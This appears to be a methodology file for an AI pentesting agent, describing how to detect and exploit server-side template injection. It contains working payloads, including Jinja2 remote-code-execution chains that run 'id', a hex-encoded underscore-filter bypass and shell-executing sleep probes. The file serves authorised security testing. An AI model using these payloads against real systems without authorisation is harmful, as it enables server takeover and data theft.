---
name: template-injection
description: Server-Side Template Injection (SSTI) testing methodology. Use when testing parameters for template injection vulnerabilities. Provides systematic baseline establishment, polyglot-based detection, template engine identification via iterative filtering, context determination, and blind detection techniques. Focuses on distinguishing true template processing from normal reflection and knowing when to stop.
---

# Server-Side Template Injection (SSTI)

SSTI occurs when user input is unsafely embedded into server-side templates, allowing attackers to inject template expressions that execute on the server. Impact ranges from information disclosure to Remote Code Execution (RCE).

## Reference Files

- [exploitation.md](./exploitation.md) — Engine-specific exploitation methodology
- [bypass.md](./bypass.md) — Filter evasion techniques and alternate syntax
- [detection_table.md](./detection_table.md) — Polyglot responses for template engines

## Workflow

```
1. BASELINE → 2. CONFIRMATION → 3. NEGATIVE VERDICT → 4. EXPLOITATION
   (behavior)    (detect + ID)    (declare not vuln)    (escalate + PoC)

   Stop conditions checked at every step ↓
```

---

## Phase 1: Baseline Establishment

**Goal:** Understand normal application behavior and identify constraints before injection testing.

### Step 1.1: Test with Unique String

Send a unique alphanumeric string (16-20 characters):

```
SSTITESTPAYLOAD17
```

Record:
- HTTP status code
- Response length (bytes)
- Whether string is reflected in immediate response
- If truncated, note maximum length allowed

### Step 1.2: Check Reflection Location

| Reflection Status | Action |
|-------------------|--------|
| Reflected in immediate response | Continue testing on this endpoint |
| Not in immediate response | Crawl application — check profile pages, admin panels, emails, logs |
| Not found anywhere | Attempt blind detection in Phase 2 |

> **STOP:** If the string is completely absent from both immediate response and all secondary locations after crawling, and there is no reason to suspect blind execution, document as "reflection not established" and stop. Injection testing without confirmed reflection or a blind scenario produces no useful signal.

### Step 1.3: Test Special Characters

Test key characters individually by sending `SSTI{char}TEST`:

```
{ } $ < > % # ' " \ / [ ] ( ) _ .
```

For each:
- Present in response → Not filtered
- Missing/encoded → Filtered (note which)
- Error/block → WAF or blacklist

**If critical characters filtered:** Refer to [bypass.md](./bypass.md), attempt bypass, then return.

### Reasoning Checkpoint

```
[PHASE-1] Baseline
[STRING] SSTITESTPAYLOAD17 → Status: {code}, Length: {bytes}
[REFLECTION] {Immediate / Secondary / Not found}
[FILTERED-CHARS] {list or "None"}
[LENGTH-LIMIT] {number or "None"}
[DECISION] {Proceed / Bypass needed / Blind detection / STOP}
```

> **STOP:** If all meaningful template delimiters (`{`, `}`, `$`, `%`) are confirmed blocked and bypass attempts across distinctly different techniques (encoding, alternate syntax, case variation, etc.) are all producing identical blocked responses with nothing new to try, document the character constraints and move to blind/alternative detection in Phase 2. Don't keep trying variations of techniques that have already clearly failed.

---

## Phase 2: Confirmation — Detection & Engine Identification

**Goal:** Determine if user input reaches a template engine parser, and identify which engine.

### Step 2.1: Error-Based Detection

Inject the universal error polyglot:

```
<%'${{/#{@}}%>{{
```

| Response | Interpretation | Confidence | Action |
|----------|----------------|------------|--------|
| Error names engine (Jinja2, Twig, etc.) | Engine revealed | HIGH | Proceed to Engine Identification |
| Generic syntax/parser error | Template processing confirmed | MEDIUM | Continue to Step 2.2 |
| Polyglot modified in output | Template processing likely | MEDIUM | Continue to Step 2.2 |
| Reflected unchanged | NOT in code context, may be plaintext context or not vulnerable | LOW | Continue to Step 2.3 |
| Blocked | Filter triggered | — | Refer to [bypass.md](./bypass.md) |

**Key insight:** If polyglot reflects completely unchanged, input did NOT pass through template parser. This rules out code context.

### Step 2.2: Non-Error Polyglot Detection

If errors are suppressed, use non-error polyglots. At least ONE will render modified if template processing occurs:

| Polyglot | If Processed |
|----------|--------------|
| `p">[[${{1}}]]` | Brackets consumed, `1` may appear |
| `<%=1%>@*#{1}` | Delimiters consumed, `1` rendered |
| `{##}/*{{.}}*/` | Comment syntax consumed |

Compare each against baseline:
- **Modified** → Template processing confirmed, proceed to Engine Identification
- **All unchanged** → Likely not in template context, try Step 2.3

### Step 2.3: Direct Expression Test

If delimiters appear blocked OR reflection is unchanged but template engine is suspected:

Test raw expression without delimiters:
```
7*7
```

| Response | Interpretation |
|----------|----------------|
| `49` | Already inside code context — delimiters not needed |
| `7*7` | Not in code context, try plaintext breakout |

### Step 2.4: Plaintext Context Breakout

If input reflects unchanged, attempt to break out of a string context:

```
}}{{7*7}}
%}{{7*7}}
*/}}{{7*7}}
'}}{{7*7}}
```

| Response | Interpretation |
|----------|----------------|
| Contains `49` | Plaintext context confirmed — successfully broke out |
| Syntax error | Parser reached, partial breakout |
| Unchanged | Not in template context |

**Q:** Why try multiple breakout patterns?
**A:** Different engines use different string delimiters. `}}` breaks Jinja2/Twig, `%}` breaks ERB-style, quotes may be needed if inside string literal.

### Step 2.5: Alternative Detection (Math Blocked)

If template processing confirmed (errors/modification) but `7*7` doesn't evaluate:

Math expressions might be blocked. Try alternatives:
```
{{"test"|upper}}     → SSTI confirmed if returns "TEST"
{{7|add:7}}          → Django-style filter
{{config}}           → Object access without math
```

### Step 2.6: Blind Detection

Attempt if:
- Reflection not found anywhere
- All polyglots return unchanged
- Strong suspicion template engine is used

**Time-based (preferred):**

Try engine-specific delays:
```
# Jinja2
{{range(999999)|list}}

# Twig  
{{sleep(5)}}

# FreeMarker
${sleep(5000)}

# Velocity
#set($x=$thread.sleep(5000))

# Generic (try each)
{{''.__class__.__mro__[2].__subclasses__()[X]('sleep 5',shell=True)}}
```

Measure response time. Delay >5s = blind SSTI confirmed.

**Q:** Why delay over OOB?
**A:** Delay requires no external infrastructure and confirms execution directly.

### Detection Confidence Summary

| Evidence | Confidence |
|----------|------------|
| Error reveals engine name | HIGH |
| Generic parser error | MEDIUM |
| Polyglot modified | MEDIUM |
| Breakout shows evaluation | MEDIUM-HIGH |
| Direct expression evaluates | HIGH |
| Time delay confirmed | MEDIUM-HIGH |
| All tests negative | Not vulnerable |

### Step 2.7: Engine Identification

**Only proceed here if detection produced at least one signal** — a modified response, a parser error, an evaluated expression, or a time delay.

#### Error Message Analysis

If error revealed partial engine name, confirm with syntax test:

| Error Contains | Test | Expected |
|----------------|------|----------|
| `jinja` | `{{7*'7'}}` | `7777777` |
| `twig` | `{{7*'7'}}` | `49` |
| `freemarker` | `${7*7}` | `49` |
| `django` | `{{7\|add:7}}` | `14` |
| `velocity` | `#set($x=7*7)$x` | `49` |

#### Differentiation Polyglot

```
{{7*'7'}}
```

| Response | Candidates |
|----------|------------|
| `7777777` | Jinja2, Mako (Python) |
| `49` | Twig, Nunjucks, Pebble |
| `7*'7'` or empty | Django, Handlebars, others |
| Error | Check error for engine hints |

#### Syntax Family Probes

Test each syntax family:

| Syntax | Test | Likely Engines |
|--------|------|----------------|
| `{{ }}` | `{{config}}` | Jinja2, Twig, Django, Nunjucks |
| `${ }` | `${7*7}` | FreeMarker, Mako, Thymeleaf |
| `#{ }` | `#{7*7}` | Pebble, Thymeleaf |
| `<%= %>` | `<%= 7*7 %>` | ERB, EJS |
| `#set` | `#set($x=1)$x` | Velocity |
| `{$ }` | `{$smarty.version}` | Smarty |

#### Engine Confirmation

**Critical:** Minimum 2-3 tests must succeed before confirming engine.

Example Jinja2 confirmation:
```
Test 1: {{7*7}} → 49 ✓
Test 2: {{7*'7'}} → 7777777 ✓
Test 3: {{config}} → <Config...> ✓
```

**Include blind test as confirmation:**
```
Test 4: {{range(999999)|list}} → Delay observed ✓
```

> **STOP:** If the differentiation polyglot and all syntax family probes have been tested and the engine still cannot be narrowed down, stop probing. Apply this decision:
> - **2+ candidates remain** → Proceed to Phase 4 with the most likely candidate; document ambiguity
> - **No syntax family produced any output** → Engine is unidentifiable; attempt only generic payloads in Phase 4 and document accordingly
>
> There are a finite number of syntax families to test. Once they're all tested with no clear winner, more probing won't change that — move forward with what you have.

#### Context Determination

After engine identified, confirm context type:

**Code context test:**
```
{{7*7}}
```
Returns `49` → Already in code context (expression evaluated directly)

**Plaintext context test:**
```
}}{{7*7}}
```
Returns `49` → Was in plaintext context (had to break out of string)

#### Django Detection

Django templates are restrictive. Identification:

| Test | Django Response | Other Engines |
|------|-----------------|---------------|
| `{{7*7}}` | Empty or `7*7` | `49` |
| `{{7*'7'}}` | Error or empty | `7777777` or `49` |
| `{{7\|add:7}}` | `14` | Error |
| `{% debug %}` | Debug output | Error |

**Q:** Why is Django different?
**A:** Django blocks method calls, underscore access, and math. It's designed for display logic, not computation.

### Reasoning Checkpoint

```
[PHASE-2] Confirmation
[ERROR-POLYGLOT] {response summary}
[NON-ERROR] {modified / unchanged}
[DIRECT-EXPR] 7*7 → {result}
[BREAKOUT] {result}
[BLIND] {delay observed / no delay}
[CONFIRMED] {Yes / No / Suspected}
[SIGNAL] {what changed from baseline, or "nothing"}
[ENGINE] {name / "Ambiguous: candidates X, Y" / "Unknown — generic only"}
[CONTEXT] {Code / Plaintext}
[DECISION] {Proceed to Phase 4 / No signal → Phase 3}
```

---

## Phase 3: Negative Verdict

**Goal:** Formally conclude that the parameter is not vulnerable to SSTI after exhaustive testing.

### When to Issue Negative Verdict

Issue a negative verdict when ALL of the following are true:
- Error polyglot reflected unchanged (no parser error, no engine name)
- All non-error polyglots reflected unchanged
- Direct expression `7*7` returned literally (not `49`)
- All plaintext breakout patterns reflected unchanged
- No time delay observed on blind payloads
- Bypass attempts (if applicable) have been exhausted

### Negative Verdict Template

```
[SSTI-NEGATIVE]
[PARAMETER] {name}
[ENDPOINT] {URL}
[STEPS-RUN]
  - Baseline: string reflected {yes/no}, filtered chars: {list}
  - Error polyglot: {result}
  - Non-error polyglots: {result}
  - Direct expression: {result}
  - Plaintext breakout: {result}
  - Blind detection: {result}
  - Bypass attempts: {result or N/A}
[SIGNAL] Nothing — all responses identical to baseline
[CONCLUSION] No template processing detected. Input is reflected as-is without any evaluation, modification, or error that would indicate a template engine is processing it.
[ACTION] Parameter cleared for SSTI. Do not proceed to Phase 4.
```

> **NOTE:** A negative verdict is a valid and important finding. It confirms the parameter was tested and is not vulnerable. Do not proceed to exploitation when detection has produced nothing.

---

## Phase 4: Exploitation

**Goal:** Determine maximum impact through progressive escalation.

**Only enter Phase 4 if Phase 2 confirmed template processing** — at least one payload produced a different response than baseline. Do not attempt exploitation if detection produced no signal.

Navigate to [exploitation.md](./exploitation.md) for engine-specific methodology.

### Escalation Steps (All Engines)

1. **Basic Expressions** — Confirm evaluation works
2. **Object Access** — Test sandbox restrictions
3. **Data Leakage** — Read config, environment, files
4. **Remote Code Execution** — Execute ONE command, then STOP

### Stop Conditions

| Condition | Action |
|-----------|--------|
| RCE confirmed | **STOP.** Report CRITICAL. |
| Data leak only | Report HIGH. Note RCE blocked. |
| Expression eval only | Report MEDIUM. Note sandbox. |
| Filters blocking | Refer to [bypass.md](./bypass.md), max 10 attempts |

---

## Reporting

When exploitation is successful, report concisely:

```
[SSTI-CONFIRMED]
[PARAMETER] {name}
[ENDPOINT] {URL}
[ENGINE] {identified or "Unknown"}
[CONTEXT] {Code / Plaintext}
[MAX-IMPACT] {RCE / Data Leak / Expression Only}
[SEVERITY] {CRITICAL / HIGH / MEDIUM / LOW}
[WORKING-PAYLOAD(S)]
  {final payload(s) that achieved max impact}
[FILTERS-BYPASSED] {if any, describe technique}
```

> **NOTE:** Do not generate a full narrative report. The reporting agent handles full report generation. Only state that exploitation succeeded and provide the final working payload(s).

### Severity Guide

| Impact | Severity |
|--------|----------|
| RCE achieved | CRITICAL |
| Sensitive data leaked | HIGH |
| Object access, no RCE | HIGH |
| Expression eval only | MEDIUM |
| Suspected, unconfirmed | LOW |

---

## Few-Shot Examples

### Example 1: Jinja2 SSTI to RCE

```
[PHASE-1] Baseline
[STRING] SSTITESTPAYLOAD17 → Status: 200, Length: 4532
[REFLECTION] Immediate
[FILTERED-CHARS] None
[DECISION] Proceed to Phase 2

[PHASE-2] Confirmation
[ERROR-POLYGLOT] <%'${{/#{@}}%>{{ → 500 "jinja2.exceptions.TemplateSyntaxError"
[SIGNAL] Engine named in error — Jinja2
[CONFIRMATION]
  - {{7*7}} → 49 ✓
  - {{7*'7'}} → 7777777 ✓
  - {{config}} → <Config {'DEBUG': True}> ✓
[ENGINE] Jinja2
[CONTEXT] Code
[DECISION] Proceed to Phase 4

[PHASE-4] Exploitation → exploitation.md
[RCE] {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
[RESPONSE] uid=33(www-data)

[SSTI-CONFIRMED]
[PARAMETER] name
[ENGINE] Jinja2
[MAX-IMPACT] RCE
[SEVERITY] CRITICAL
[WORKING-PAYLOAD(S)]
  {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### Example 2: Filtered Delimiters, Already in Code Context

```
[PHASE-1] Baseline
[STRING] SSTITESTPAYLOAD17 → Status: 200, Length: 2841
[REFLECTION] Immediate
[FILTERED-CHARS] { } blocked (403 on test)
[BYPASS] Tried URL encoding, alternate syntax ${7*7}, case variation — all blocked
[DECISION] All distinct bypass techniques exhausted → move to direct expression test

[PHASE-2] Confirmation
[DIRECT-EXPR] 7*7 → 49 ✓ (already in code context, delimiters not needed)
[SIGNAL] Expression evaluated — template processing confirmed
[DIRECT-TESTS]
  - 7*7 → 49 ✓
  - 7*'7' → 7777777 ✓ (Jinja2 behavior)
  - range(999999)|list → 6 second delay ✓
[ENGINE] Jinja2 (code context, delimiters filtered)
[DECISION] Proceed to Phase 4

[PHASE-4] Exploitation
[ATTEMPT] config.__class__... → Blocked (underscore filtered)
[BYPASS] Using hex: \x5f\x5fclass\x5f\x5f → Works
[RCE] config['\x5f\x5fclass\x5f\x5f']... → uid=33(www-data)

[SSTI-CONFIRMED]
[PARAMETER] input
[ENGINE] Jinja2 (code context)
[MAX-IMPACT] RCE
[SEVERITY] CRITICAL
[WORKING-PAYLOAD(S)]
  config['\x5f\x5fclass\x5f\x5f']['\x5f\x5finit\x5f\x5f']['\x5f\x5fglobals\x5f\x5f']['os'].popen('id').read()
[FILTERS-BYPASSED] Underscore filter via hex encoding (\x5f)
```

### Example 3: No Signal Anywhere — Negative Verdict

```
[PHASE-1] Baseline
[STRING] SSTITESTPAYLOAD17 → Status: 200, Length: 1203
[REFLECTION] Immediate
[FILTERED-CHARS] None
[DECISION] Proceed to Phase 2

[PHASE-2] Confirmation
[ERROR-POLYGLOT] <%'${{/#{@}}%>{{ → Reflected unchanged
[NON-ERROR] All 3 polyglots reflected unchanged
[DIRECT-EXPR] 7*7 → "7*7" (not 49)
[BREAKOUT] All 4 patterns reflected unchanged
[BLIND] No delay observed
[SIGNAL] Nothing — every payload returned identical to baseline
[DECISION] No signal → Phase 3

[SSTI-NEGATIVE]
[PARAMETER] search
[STEPS-RUN] Error polyglot, 3 non-error polyglots, direct expression, 4 breakout patterns, blind delay
[SIGNAL] Nothing — all responses identical to baseline
[CONCLUSION] No template processing detected. Parameter not vulnerable to SSTI.
```
